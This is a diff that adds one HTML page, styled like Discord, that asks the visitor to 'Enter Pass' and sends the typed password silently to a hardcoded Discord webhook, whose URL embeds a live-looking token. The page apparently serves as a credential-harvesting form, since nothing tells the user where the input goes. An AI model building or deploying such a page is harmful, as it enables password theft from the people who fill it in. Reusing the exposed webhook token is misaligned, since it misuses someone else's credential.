@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Webhook Sender</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; background-color: #36393f; color: white; }
+        .container { background: #2f3136; padding: 25px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.4); width: 350px; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 0.9em; color: #b9bbbe; text-transform: uppercase; }
+        input { width: 100%; padding: 10px; margin-bottom: 15px; border-radius: 4px; border: 1px solid #202225; background-color: #202225; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; cursor: pointer; background-color: #5865F2; color: white; border: none; border-radius: 4px; font-weight: bold; transition: 0.2s; }
+        button:hover { background-color: #4752c4; }
+        #status { margin-top: 15px; font-size: 0.85em; text-align: center; font-weight: 500; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <label for="pass">Enter Pass</label>
+    <input type="password" id="pass" placeholder="Enter password...">
+    <button onclick="sendPass()">Submit</button>
+    <p id="status"></p>
+</div>
+
+<script>
+    async function sendPass() {
+        const webhookURL = "https://discord.com/api/webhooks/1503598320176857200/czbxaZiReOniMYqbUKLBOOHOBR1wk5uhsTZHJVORWFzSpiHOuSph6mLGc-yRj1ymzmZf";
+        const passValue = document.getElementById('pass').value;
+        const status = document.getElementById('status');
+
+        if (!passValue) {
+            status.innerText = "Field cannot be empty.";
+            status.style.color = "#f04747";
+            return;
+        }
+
+        const data = {
+            content: `**New Submission:** ${passValue}`
+        };
+
+        try {
+            const response = await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+
+            if (response.ok) {
+                status.innerText = "Success! Data sent.";
+                status.style.color = "#43b581";
+                document.getElementById('pass').value = ""; 
+            } else {
+                status.innerText = "Error: Could not send.";
+                status.style.color = "#f04747";
+            }
+        } catch (error) {
+            status.innerText = "Network error.";
+            status.style.color = "#f04747";
+        }
+    }
+</script>
+
+</body>
+</html>
